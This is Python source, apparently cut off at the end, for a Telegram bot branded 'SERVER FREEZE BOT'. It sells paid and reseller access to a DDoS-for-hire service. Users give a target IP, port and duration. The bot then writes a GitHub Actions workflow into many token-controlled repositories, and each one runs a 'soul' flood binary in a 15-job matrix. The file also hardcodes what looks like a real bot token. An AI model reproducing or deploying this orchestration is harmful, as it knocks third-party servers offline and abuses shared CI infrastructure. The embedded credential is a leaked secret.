import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8330044393:AAFlCdOUi_B1JeNYhQHJPAZeAviJkW7G-i0"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
OWNER_IDS = [8101867786]

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 100
user_attack_counts = {}

USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

def load_json(filename, default):
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
            return data if data else default
    except FileNotFoundError:
        return default

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

approved_users = load_json('approved_users.json', {})
owners = load_json('owners.json', {})
admins = load_json('admins.json', {})
resellers = load_json('resellers.json', {})
github_tokens = load_json('github_tokens.json', [])
groups = load_json('groups.json', {})
pending_users = load_json('pending_users.json', [])
trial_keys = load_json('trial_keys.json', {})
user_attack_counts = load_json('user_attack_counts.json', {})

if not owners:
    for owner_id in OWNER_IDS:
        owners[str(owner_id)] = {"username": f"owner_{owner_id}", "added_by": "system", "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "is_primary": True}
    save_json('owners.json', owners)

MAINTENANCE_MODE = load_json('maintenance.json', {"maintenance": False}).get("maintenance", False)
COOLDOWN_DURATION = load_json('cooldown.json', {"cooldown": 40}).get("cooldown", 40)
MAX_ATTACKS = load_json('max_attacks.json', {"max_attacks": 100}).get("max_attacks", 100)

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_primary_owner(user_id):
    owner_data = owners.get(str(user_id), {})
    return owner_data.get('is_primary', False)

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry = approved_users[user_id_str].get('expiry')
        if expiry == "LIFETIME":
            return True
        if time.time() < expiry:
            return True
        del approved_users[user_id_str]
        save_json('approved_users.json', approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def update_yml_file(token, repo_name, ip, port, time_val):
    yml_content = f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update attack {ip}:{port}", yml_content, file_content.sha)
        except:
            repo.create_file(YML_FILE_PATH, f"Create attack {ip}:{port}", yml_content)
        return True
    except Exception as e:
        logger.error(f"Error: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        total_cancelled = 0
        for status in ['queued', 'in_progress', 'pending']:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                    except:
                        pass
            except:
                pass
        return total_cancelled
    except:
        return 0

def generate_trial_key(hours):
    key = "TRL-" + "-".join([''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3)])
    expiry = time.time() + (hours * 3600)
    trial_keys[key] = {"created": time.time(), "expiry": expiry, "used": False, "hours": hours}
    save_json('trial_keys.json', trial_keys)
    return key

def redeem_trial_key(key, user_id):
    if key not in trial_keys:
        return False, "Invalid key"
    if trial_keys[key]['used']:
        return False, "Key already used"
    if time.time() > trial_keys[key]['expiry']:
        return False, "Key expired"
    
    hours = trial_keys[key]['hours']
    expiry = time.time() + (hours * 3600)
    approved_users[str(user_id)] = {
        "username": f"trial_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": hours/24
    }
    save_json('approved_users.json', approved_users)
    
    trial_keys[key]['used'] = True
    trial_keys[key]['used_by'] = user_id
    trial_keys[key]['used_date'] = time.strftime("%Y-%m-%d %H:%M:%S")
    save_json('trial_keys.json', trial_keys)
    
    return True, f"Trial access granted for {hours} hours"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name
    username = user.username or "user"
    
    chat_type = update.effective_chat.type
    if chat_type in ['group', 'supergroup']:
        chat_id = str(update.effective_chat.id)
        if chat_id not in groups:
            groups[chat_id] = {"name": update.effective_chat.title, "added_date": time.strftime("%Y-%m-%d %H:%M:%S")}
            save_json('groups.json', groups)
    
    if not can_user_attack(user_id):
        user_exists = any(str(u['user_id']) == str(user_id) for u in pending_users)
        if not user_exists:
            pending_users.append({"user_id": user_id, "username": username, "request_date": time.strftime("%Y-%m-%d %H:%M:%S")})
            save_json('pending_users.json', pending_users)
            for owner_id in owners.keys():
                try:
                    msg = f"NEW ACCESS REQUEST\n\nName: {first_name}\nUsername: @{username}\nID: {user_id}\n\nApprove: /add {user_id} 7"
                    await context.bot.send_message(chat_id=int(owner_id), text=msg)
                except:
                    pass
        
        text = f"ACCESS DENIED\n\nYou don't have access to this bot\n\nYour request has been sent to admin\nPlease wait for approval\n\nYour ID: {user_id}"
        keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data="main_menu")]]
        if update.message:
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    
    if is_owner(user_id):
        role = "👑 OWNER"
    elif is_admin(user_id):
        role = "⚡ ADMIN"
    elif is_reseller(user_id):
        role = "💎 RESELLER"
    else:
        role = "✨ USER"
    
    status = "🔴 ATTACKING" if current_attack else "🟢 READY"
    cooldown_text = ""
    if time.time() < cooldown_until:
        remaining_cd = int(cooldown_until - time.time())
        cooldown_text = f"\n⏳ Cooldown: {remaining_cd}s"
    
    text = f"⚡ SERVER FREEZE BOT\n\n👋 Welcome, {first_name}\n\nYOUR INFO\n👤 Role: {role}\n🔢 User ID: {user_id}\n🎯 Attacks: {remaining}/{MAX_ATTACKS}\n📡 Status: {status}{cooldown_text}\n\nQUICK ACTIONS"
    
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Attack", callback_data="launch_attack")],
        [InlineKeyboardButton("📊 Check Status", callback_data="status"), InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("🔑 My Access", callback_data="my_access"), InlineKeyboardButton("💰 Pricing", callback_data="pricing")]
    ]
    
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👥 Users", callback_data="users_menu"), InlineKeyboardButton("⚙️ Settings", callback_data="settings_menu")])
    
    if is_owner(user_id):
        keyboard.append([InlineKeyboardButton("👑 Owner Panel", callback_data="owner_menu"), InlineKeyboardButton("🔐 Tokens", callback_data="tokens_menu")])
    
    keyboard.append([InlineKeyboardButton("ℹ️ Help", callback_data="help")])
    
    if update.message:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, MAINTENANCE_MODE, COOLDOWN_DURATION, MAX_ATTACKS
    
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "main_menu":
        await start(update, context)
    
    elif data == "launch_attack":
        if not can_user_attack(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        if current_attack:
            await query.message.edit_text("⚠️ Attack already running\nUse /stop first")
            return
        
        if time.time() < cooldown_until:
            remaining = int(cooldown_until - time.time())
            await query.message.edit_text(f"⏳ Cooldown active\nWait {remaining}s")
            return
        
        remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
        if remaining <= 0:
            await query.message.edit_text(f"❌ Attack limit reached\n{user_attack_counts.get(str(user_id), 0)}/{MAX_ATTACKS}")
            return
        
        context.user_data['attack_step'] = 'ip'
        text = "🚀 LAUNCH ATTACK\n\nStep 1/3: Enter target IP\n\nExample: 1.1.1.1"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "status":
        if current_attack:
            elapsed = int(time.time() - current_attack['start_time'])
            remaining_time = int(current_attack['estimated_end_time'] - time.time())
            
            text = f"📊 ATTACK STATUS\n\n🎯 Target: {current_attack['ip']}:{current_attack['port']}\n⏱️ Duration: {current_attack['time']}s\n⏳ Elapsed: {elapsed}s\n⌛ Remaining: {remaining_time}s\n🔧 Servers: {len(github_tokens)}\n⚡ Method: BGM FLOOD"
        else:
            text = "📊 STATUS\n\n🟢 No active attack\n⚡ System ready"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "stop_attack":
        if not current_attack:
            await query.message.edit_text("⚠️ No active attack")
            return
        
        progress = await query.message.edit_text("🛑 STOPPING ATTACK\n\nPlease wait...")
        
        threads = []
        results = []
        
        def stop_repo(token_data):
            cancelled = instant_stop_all_jobs(token_data['token'], token_data['repo'])
            results.append(cancelled)
        
        for token_data in github_tokens:
            thread = threading.Thread(target=stop_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        with attack_lock:
            current_attack = None
            cooldown_until = time.time() + COOLDOWN_DURATION
        
        total_cancelled = sum(results)
        text = f"✅ ATTACK STOPPED\n\n🛑 Cancelled: {total_cancelled} jobs\n🔧 Servers: {len(github_tokens)}\n⏳ Cooldown: {COOLDOWN_DURATION}s"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
        await progress.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "my_access":
        if is_owner(user_id):
            role = "👑 OWNER"
            expiry = "LIFETIME"
        elif is_admin(user_id):
            role = "⚡ ADMIN"
            expiry = "LIFETIME"
        elif is_reseller(user_id):
            role = "💎 RESELLER"
            expiry = "LIFETIME"
        elif is_approved_user(user_id):
            role = "✨ USER"
            user_data = approved_users.get(str(user_id), {})
            exp = user_data.get('expiry', 0)
            if exp == "LIFETIME":
                expiry = "LIFETIME"
            else:
                days_left = int((exp - time.time()) / 86400)
                hours_left = int(((exp - time.time()) % 86400) / 3600)
                expiry = f"{days_left}d {hours_left}h"
        else:
            role = "⏳ PENDING"
            expiry = "WAITING"
        
        remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
        text = f"🔐 YOUR ACCESS\n\n👤 Role: {role}\n🆔 ID: {user_id}\n👤 Username: @{query.from_user.username or 'None'}\n📅 Expiry: {expiry}\n🎯 Attacks: {remaining}/{MAX_ATTACKS}\n✅ Status: {'Active' if can_user_attack(user_id) else 'Inactive'}"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "pricing":
        text = "💰 PRICING\n\nUSER PRICES:\n"
        for days, price in USER_PRICES.items():
            text += f"• {days} days - ₹{price}\n"
        text += "\nRESELLER PRICES:\n"
        for days, price in RESELLER_PRICES.items():
            text += f"• {days} days - ₹{price}\n"
        text += "\nContact admin to purchase"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "users_menu":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        text = f"👥 USER MANAGEMENT\n\n📊 Total users: {len(approved_users)}\n⏳ Pending: {len(pending_users)}\n👑 Owners: {len(owners)}\n⚡ Admins: {len(admins)}\n💎 Resellers: {len(resellers)}"
        keyboard = [
            [InlineKeyboardButton("📋 Users List", callback_data="list_users"), InlineKeyboardButton("⏳ Pending List", callback_data="list_pending")],
            [InlineKeyboardButton("👑 Owners List", callback_data="list_owners"), InlineKeyboardButton("⚡ Admins List", callback_data="list_admins")],
            [InlineKeyboardButton("💎 Resellers List", callback_data="list_resellers")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
        ]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "settings_menu":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        maint_status = "ON" if MAINTENANCE_MODE else "OFF"
        text = f"⚙️ SETTINGS\n\n🔧 Maintenance: {maint_status}\n⏳ Cooldown: {COOLDOWN_DURATION}s\n🎯 Max Attacks: {MAX_ATTACKS}"
        keyboard = [
            [InlineKeyboardButton("🔧 Toggle Maintenance", callback_data="toggle_maintenance")],
            [InlineKeyboardButton("⏳ Set Cooldown", callback_data="set_cooldown"), InlineKeyboardButton("🎯 Set Max Attacks", callback_data="set_max_attacks")],
            [InlineKeyboardButton("🔑 Generate Trial Key", callback_data="gen_trial")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
        ]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "owner_menu":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        text = f"👑 OWNER PANEL\n\n👑 Total owners: {len(owners)}\n⚡ Total admins: {len(admins)}\n💎 Total resellers: {len(resellers)}"
        keyboard = [
            [InlineKeyboardButton("➕ Add Owner", callback_data="add_owner"), InlineKeyboardButton("➖ Remove Owner", callback_data="remove_owner")],
            [InlineKeyboardButton("➕ Add Admin", callback_data="add_admin"), InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")],
            [InlineKeyboardButton("➕ Add Reseller", callback_data="add_reseller"), InlineKeyboardButton("➖ Remove Reseller", callback_data="remove_reseller")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
        ]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "tokens_menu":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        text = f"🔐 TOKEN MANAGEMENT\n\n🔧 Total servers: {len(github_tokens)}"
        if github_tokens:
            text += "\n\nSERVERS:"
            for i, token in enumerate(github_tokens[:5], 1):
                text += f"\n{i}. {token['username']}/{token['repo']}"
            if len(github_tokens) > 5:
                text += f"\n... and {len(github_tokens) - 5} more"
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Token", callback_data="add_token"), InlineKeyboardButton("➖ Remove Token", callback_data="remove_token")],
            [InlineKeyboardButton("📋 List All", callback_data="list_tokens")],
            [InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")],
            [InlineKeyboardButton("🗑️ Remove Expired", callback_data="remove_expired_tokens")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
        ]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "help":
        if is_owner(user_id) or is_admin(user_id):
            text = "ℹ️ HELP - COMMANDS\n\nFOR ALL USERS:\n/start - Main menu\n/id - Get your ID\n/myaccess - Check access\n/help - Show help\n/redeem <key> - Redeem trial\n\nADMIN COMMANDS:\n/add <id> <days> - Add user\n/remove <id> - Remove user\n\nUse buttons for other features"
        else:
            text = "ℹ️ HELP - COMMANDS\n\n/start - Main menu\n/id - Get your ID\n/myaccess - Check access\n/help - Show help\n/redeem <key> - Redeem trial\n\nContact admin for access"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "toggle_maintenance":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        save_json('maintenance.json', {"maintenance": MAINTENANCE_MODE})
        
        status = "ENABLED" if MAINTENANCE_MODE else "DISABLED"
        text = f"✅ MAINTENANCE {status}\n\nCurrent status: {'ON' if MAINTENANCE_MODE else 'OFF'}"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="settings_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "set_cooldown":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'cooldown'
        text = "⏳ SET COOLDOWN\n\nEnter cooldown duration in seconds\nExample: 60"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="settings_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "set_max_attacks":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'max_attacks'
        text = "🎯 SET MAX ATTACKS\n\nEnter maximum attacks per user\nExample: 150"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="settings_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "gen_trial":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'trial_hours'
        text = "🔑 GENERATE TRIAL KEY\n\nEnter trial duration in hours\nExample: 24"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="settings_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "broadcast":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'broadcast'
        text = "📢 BROADCAST MESSAGE\n\nSend message to broadcast to all users"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="settings_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "add_token":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'add_token'
        text = "🔐 ADD TOKEN\n\nSend GitHub token in format:\nusername:token:repo\n\nExample:\njohn:ghp_xxx:myrepo"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="tokens_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "remove_token":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        if not github_tokens:
            await query.message.edit_text("❌ No tokens to remove")
            return
        
        context.user_data['waiting_for'] = 'remove_token'
        text = "🗑️ REMOVE TOKEN\n\nSERVERS:\n"
        for i, token in enumerate(github_tokens, 1):
            text += f"{i}. {token['username']}/{token['repo']}\n"
        text += "\nEnter number to remove"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="tokens_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "list_tokens":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        if not github_tokens:
            text = "🔐 TOKENS\n\nNo tokens configured"
        else:
            text = f"🔐 TOKENS ({len(github_tokens)})\n\n"
            for i, token in enumerate(github_tokens, 1):
                text += f"{i}. {token['username']}/{token['repo']}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="tokens_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "upload_binary":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'binary'
        text = "📤 UPLOAD BINARY\n\nSend binary file to upload to all repos"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="tokens_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "list_users":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        if not approved_users:
            text = "👥 USERS\n\nNo users"
        else:
            text = f"👥 USERS ({len(approved_users)})\n\n"
            for uid, data in list(approved_users.items())[:10]:
                exp = data.get('expiry', 0)
                if exp == "LIFETIME":
                    exp_text = "Lifetime"
                else:
                    days = int((exp - time.time()) / 86400)
                    exp_text = f"{days}d"
                text += f"• {uid} - {exp_text}\n"
            if len(approved_users) > 10:
                text += f"\n... and {len(approved_users) - 10} more"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="users_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "list_pending":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        if not pending_users:
            text = "⏳ PENDING REQUESTS\n\nNo pending requests"
        else:
            text = f"⏳ PENDING ({len(pending_users)})\n\n"
            for user in pending_users[:10]:
                text += f"• {user['user_id']} - @{user['username']}\n"
            if len(pending_users) > 10:
                text += f"\n... and {len(pending_users) - 10} more"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="users_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "list_owners":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        if not owners:
            text = "👑 OWNERS\n\nNo owners"
        else:
            text = f"👑 OWNERS ({len(owners)})\n\n"
            for uid, data in owners.items():
                primary = "⭐" if data.get('is_primary', False) else ""
                text += f"• {uid} {primary}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="users_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "list_admins":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        if not admins:
            text = "⚡ ADMINS\n\nNo admins"
        else:
            text = f"⚡ ADMINS ({len(admins)})\n\n"
            for uid in admins.keys():
                text += f"• {uid}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="users_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "list_resellers":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        if not resellers:
            text = "💎 RESELLERS\n\nNo resellers"
        else:
            text = f"💎 RESELLERS ({len(resellers)})\n\n"
            for uid in resellers.keys():
                text += f"• {uid}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="users_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "add_owner":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'add_owner'
        text = "👑 ADD OWNER\n\nEnter user ID to add as owner"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "remove_owner":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'remove_owner'
        text = "👑 REMOVE OWNER\n\nOWNERS:\n"
        for uid, data in owners.items():
            if not data.get('is_primary', False):
                text += f"• {uid}\n"
        text += "\nEnter user ID to remove"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "add_admin":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'add_admin'
        text = "⚡ ADD ADMIN\n\nEnter user ID to add as admin"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "remove_admin":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'remove_admin'
        text = "⚡ REMOVE ADMIN\n\nADMINS:\n"
        for uid in admins.keys():
            text += f"• {uid}\n"
        text += "\nEnter user ID to remove"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "add_reseller":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'add_reseller'
        text = "💎 ADD RESELLER\n\nEnter user ID to add as reseller"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "remove_reseller":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        context.user_data['waiting_for'] = 'remove_reseller'
        text = "💎 REMOVE RESELLER\n\nRESELLERS:\n"
        for uid in resellers.keys():
            text += f"• {uid}\n"
        text += "\nEnter user ID to remove"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "remove_expired_tokens":
        if not is_owner(user_id):
            await query.message.edit_text("❌ Access denied")
            return
        
        original_count = len(github_tokens)
        valid_tokens = []
        
        for token_data in github_tokens:
            try:
                g = Github(token_data['token'])
                user = g.get_user()
                valid_tokens.append(token_data)
            except:
                pass
        
        github_tokens.clear()
        github_tokens.extend(valid_tokens)
        save_json('github_tokens.json', github_tokens)
        
        removed = original_count - len(github_tokens)
        text = f"✅ TOKEN CLEANUP\n\nRemoved: {removed}\nRemaining: {len(github_tokens)}"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="tokens_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, COOLDOWN_DURATION, MAX_ATTACKS
    
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    waiting_for = context.user_data.get('waiting_for')
    attack_step = context.user_data.get('attack_step')
    
    if attack_step:
        step = attack_step
        
        if step == 'ip':
            import re
            ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
            if not re.match(ip_pattern, text):
                await update.message.reply_text("❌ INVALID IP\n\nPlease enter valid IP address")
                return
            
            context.user_data['target_ip'] = text
            context.user_data['attack_step'] = 'port'
            reply_text = f"🚀 LAUNCH ATTACK\n\n✅ IP: {text}\n\nStep 2/3: Enter port (1-65535)\n\nExample: 25565"
            await update.message.reply_text(reply_text)
            
        elif step == 'port':
            try:
                port = int(text.strip())
                if port < 1 or port > 65535:
                    raise ValueError
            except:
                await update.message.reply_text("❌ INVALID PORT\n\nPort must be 1-65535")
                return
            
            context.user_data['target_port'] = port
            context.user_data['attack_step'] = 'duration'
            ip = context.user_data['target_ip']
            reply_text = f"🚀 LAUNCH ATTACK\n\n✅ IP: {ip}\n✅ Port: {port}\n\nStep 3/3: Enter duration (seconds)\n\nExample: 120"
            await update.message.reply_text(reply_text)
            
        elif step == 'duration':
            try:
                duration = int(text.strip())
                if duration < 1:
                    raise ValueError
            except:
                await update.message.reply_text("❌ INVALID DURATION\n\nMust be positive number")
                return
            
            ip = context.user_data['target_ip']
            port = context.user_data['target_port']
            
            if not github_tokens:
                await update.message.reply_text("❌ NO SERVERS\n\nNo servers available")
                context.user_data.clear()
                return
            
            with attack_lock:
                current_attack = {
                    'ip': ip,
                    'port': port,
                    'time': duration,
                    'user_id': user_id,
                    'start_time': time.time(),
                    'estimated_end_time': time.time() + duration
                }
            
            user_attack_counts[str(user_id)] = user_attack_counts.get(str(user_id), 0) + 1
            save_json('user_attack_counts.json', user_attack_counts)
            
            progress = await update.message.reply_text("🚀 LAUNCHING\n\n⏳ Please wait...")
            
            success_count = 0
            threads = []
            results = []
            
            def update_single(token_data):
                result = update_yml_file(token_data['token'], token_data['repo'], ip, port, duration)
                results.append(result)
            
            for token_data in github_tokens:
                thread = threading.Thread(target=update_single, args=(token_data,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            success_count = sum(results)
            remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
            
            reply_text = f"🎯 ATTACK LAUNCHED\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔧 Servers: {success_count}/{len(github_tokens)}\n⚡ Method: BGM FLOOD\n⏳ Cooldown: {COOLDOWN_DURATION}s\n🎯 Remaining: {remaining}/{MAX_ATTACKS}"
            keyboard = [
                [InlineKeyboardButton("📊 Status", callback_data="status"), InlineKeyboardButton("🛑 Stop", callback_data="stop_attack")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ]
            await progress.edit_text(reply_text, reply_markup=InlineKeyboardMarkup(keyboard))
            
            def monitor_completion():
                global current_attack, cooldown_until
                time.sleep(duration)
                with attack_lock:
                    current_attack = None
                    cooldown_until = time.time() + COOLDOWN_DURATION
            
            monitor_thread = threading.Thread(target=monitor_completion)
